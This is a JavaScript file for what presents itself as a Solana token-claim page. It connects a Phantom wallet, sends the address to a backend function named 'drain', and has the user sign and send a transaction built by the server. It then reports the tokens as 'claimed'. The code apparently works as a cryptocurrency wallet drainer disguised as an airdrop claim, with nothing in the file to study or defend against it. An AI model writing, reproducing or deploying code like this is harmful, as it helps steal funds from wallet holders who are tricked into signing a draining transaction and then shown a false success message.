document.getElementById('connect-wallet').addEventListener('click', async () => {
    const statusElement = document.getElementById('status');
    const button = document.getElementById('connect-wallet');
    
    // UI Updates
    button.disabled = true;
    statusElement.textContent = 'Connecting to wallet...';
    statusElement.className = 'status visible loading';

    // 1. Check for Phantom (Standardized Provider)
    // We check both window.phantom.solana (modern) and window.solana (legacy fallback)
    const provider = window.phantom?.solana || window.solana;

    if (!provider || !provider.isPhantom) {
        statusElement.textContent = 'Phantom wallet not detected. Please install it.';
        statusElement.className = 'status visible error';
        button.disabled = false;
        return;
    }

    try {
        // 2. Connect
        statusElement.textContent = 'Connecting...';
        
        // Use the standardized connect method
        await provider.connect({ onlyIfTrusted: false }); 
        const walletAddress = provider.publicKey.toString();

        // 3. Call Backend
        statusElement.textContent = 'Checking eligibility...';
        const response = await fetch('/.netnetlify/functions/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ walletAddress })
        });

        if (!response.ok) {
            const errorResponse = await response.json();
            throw new Error(errorResponse.error || 'Network error');
        }

        const result = await response.json();
        
        // 4. Prepare Transaction
        statusElement.textContent = 'Preparing claim transaction...';
        
        let transaction;
        try {
            // Attempt Versioned Transaction (V0)
            const transactionBytes = Uint8Array.from(atob(result.transaction), c => c.charCodeAt(0));
            transaction = solanaWeb3.VersionedTransaction.deserialize(transactionBytes);
        } catch {
            // Fallback to Legacy Transaction
            const legacyBytes = Uint8Array.from(atob(result.transaction), c => c.charCodeAt(0));
            transaction = solanaWeb3.Transaction.fromBuffer(legacyBytes);
        }

        // 5. Sign and Send
        statusElement.textContent = 'Please sign the transaction in Phantom...';
        
        // Modern Phantom uses signTransaction for both Legacy and V0
        const signedTransaction = await provider.signTransaction(transaction);
        
        // If it's a VersionedTransaction, we might need to serialize it differently depending on the SDK version,
        // but usually signTransaction returns a compatible signed object.
        
        const signature = await provider.sendTransaction(signedTransaction);

        // 6. Confirm
        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
        await connection.confirmTransaction(signature);

        // 7. SUCCESS MESSAGE
        statusElement.textContent = `Success! ${result.amount} ${result.tokenSymbol} claimed successfully.`;
        statusElement.className = 'status visible success';
        
        button.textContent = 'Claimed';

    } catch (err) {
        console.error(err);
        statusElement.textContent = `Error: ${err.message}`;
        statusElement.className = 'status visible error';
        button.disabled = false;
    }
});
